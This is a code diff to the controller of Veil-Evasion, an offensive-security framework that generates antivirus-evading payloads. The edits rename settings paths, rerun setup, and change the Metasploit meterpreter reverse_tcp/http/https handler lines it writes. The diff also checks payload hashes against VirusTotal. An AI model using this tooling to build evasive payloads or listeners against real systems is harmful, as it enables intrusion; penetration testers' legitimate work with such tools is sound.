@@ -1,5 +1,5 @@
 """
-Contains the main controller object for Veil.
+Contains the main controller object for Veil-Evasion.
 
 """
 
@@ -23,6 +23,22 @@ if os.path.exists("/etc/veil/settings.py"):
     try:
         sys.path.append("/etc/veil/")
         import settings
+
+        # check for a few updated values to see if we have a new or old settings.py file
+        try:
+            settings.VEIL_EVASION_PATH
+        except AttributeError:
+            os.system('clear')
+            print '========================================================================='
+            print ' New major Veil-Evasion version installed'
+            print ' Re-running ./setup/setup.sh'
+            print '========================================================================='
+            time.sleep(3)
+            os.system('cd setup && ./setup.sh')
+
+            # reload the settings import to refresh the values
+            reload(settings)
+
     except ImportError:
         print "\n [!] ERROR: run ./config/update.py manually\n"
         sys.exit()
@@ -40,8 +56,8 @@ else:
     print ' Veil First Run Detected... Initializing Script Setup...'
     print '========================================================================='
     # run the config if it hasn't been run
-    print '\n [*] Executing ./config/update.py...'
-    os.system('cd config && python update.py')
+    print '\n [*] Executing ./setup/setup.sh'
+    os.system('cd setup && ./setup.sh')
 
     # check for the config again and error out if it can't be found.
     if os.path.exists("/etc/veil/settings.py"):
@@ -122,7 +138,7 @@ class Controller:
         for x in xrange(1,5):    
             # make the folder structure the key for the module
 
-            d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )
+            d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_EVASION_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )
 
             # instantiate the payload stager
             for name in d.keys():
@@ -158,7 +174,7 @@ class Controller:
         """
         print "\n Updating Veil via git...\n"
         updatecommand = ['git', 'pull']
-        updater = subprocess.Popen(updatecommand, cwd=settings.VEIL_PATH, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        updater = subprocess.Popen(updatecommand, cwd=settings.VEIL_EVASION_PATH, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         updoutput, upderr = updater.communicate()
 
         if interactive:
@@ -176,7 +192,7 @@ class Controller:
             if os.stat(settings.HASH_LIST)[6] != 0:
                 checkVTcommand = "./vt-notify.rb -f " + settings.HASH_LIST + " -i 0"
                 print helpers.color("\n [*] Checking Virus Total for payload hashes...\n")
-                checkVTout = Popen(checkVTcommand.split(), stdout=PIPE, cwd=settings.VEIL_PATH + "tools/vt-notify/")
+                checkVTout = Popen(checkVTcommand.split(), stdout=PIPE, cwd=settings.VEIL_EVASION_PATH + "tools/vt-notify/")
 
                 found = False
                 for line in checkVTout.stdout:
@@ -408,7 +424,8 @@ class Controller:
         # extract the payload class name from the instantiated object, then chop off the load folder prefix
         payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
         message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname
-
+        handler = ""
+        
         if hasattr(payload, 'shellcode'):
             # check if msfvenom was used or something custom, print appropriately
             if payload.shellcode.customshellcode != "":
@@ -473,15 +490,19 @@ class Controller:
                 else:
                     # extract the payload class name from the instantiated object, then chop off the load folder prefix
                     payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
+                    
+                    lhost = helpers.LHOST()
+
                     if "tcp" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                        handler += "set LHOST 0.0.0.0\n"
                     elif "https" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                        handler += "set LHOST " + lhost + "\n"
                     elif "http" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
+                        handler += "set LHOST " + lhost + "\n"
                     else: pass
-
-                handler += "set LHOST 0.0.0.0\n"
 
                 if "LPORT" in keys:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
@@ -495,11 +516,12 @@ class Controller:
         # if we're generating the handler script, write it out
         try:
             if settings.GENERATE_HANDLER_SCRIPT.lower() == "true":
-                handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
-                handlerFile = open(handlerFileName, 'w')
-                handlerFile.write(handler)
-                handlerFile.close()
-                message += " Handler File:\t\t"+handlerFileName + "\n"
+                if handler != "":
+                    handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
+                    handlerFile = open(handlerFileName, 'w')
+                    handlerFile.write(handler)
+                    handlerFile.close()
+                    message += " Handler File:\t\t"+handlerFileName + "\n"
         except:
             # is that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
             print helpers.color("\n [!] Please run ./config/update.py !", warning=True)
